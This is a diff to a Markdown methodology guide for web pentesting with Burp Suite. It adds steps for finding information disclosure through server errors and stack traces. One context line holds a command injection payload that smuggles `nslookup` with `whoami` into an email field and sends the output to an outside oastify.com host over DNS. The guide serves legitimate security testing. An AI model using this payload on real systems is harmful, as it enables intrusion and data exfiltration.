@@ -24,7 +24,7 @@ In order to save CPU and memory usage, extensions can be enabled and disabled ba
 
 # Methodology
 
-## :o: Step 1 - Discover attack surface
+## :o: Step 1 - Discover attack surface & information disclosure
 ### :white_check_mark: Crawl target
 The objective is to have as much information (_i.e._ web pages) as possible on our target.
 1. Go on the _Dashboard_ tab
@@ -75,6 +75,27 @@ On the _Target_ tab :
 3. Click on _Find scripts_
 Check if interesting data can be found.
 
+### :white_check_mark: Analyze errors
+Error message can contain stack trace and other useful information.
+
+#### Technique 1 - Filter 5xx errors
+In the _Target_ tab :
+1. Click on filters
+2. Enable only in-scope items
+3. Filter by status code 5xx [server error]
+4. Look at every response received
+
+#### Technique 2 - Filter 5xx errors
+In the _Target_ tab :
+1. Click on filters
+2. Enable only in-scope items
+3. Search terms :
+  - "Error"
+  - "Stack"
+  - "Stack trace"
+  - "Debug"
+  - Etc...
+
 ### Find hidden headers
 Use Param Miner automatically?!
 
@@ -120,7 +141,8 @@ The main command injection objective is to extract data. Multiple ways to achiev
 - Results extracted with DNS request e.g. `test%40test.fr%7cnslookup%20-q%3dcname%20%60whoami%60.8y7ds87rolk2iziyuihztmwqwh28q0ep.oastify.com.%26` i.e. ``test@test.fr|nslookup -q=cname `whoami`.8y7ds87rolk2iziyuihztmwqwh28q0ep.oastify.com.&``
 
 ### :white_check_mark: Business logic vulnerabilities
-### :white_check_mark: Information disclosure
+
+
 ### :white_check_mark: Access control
 #### Step 1 - Identify logic error
 Authentication may rely on poor access control. The following must be verified :
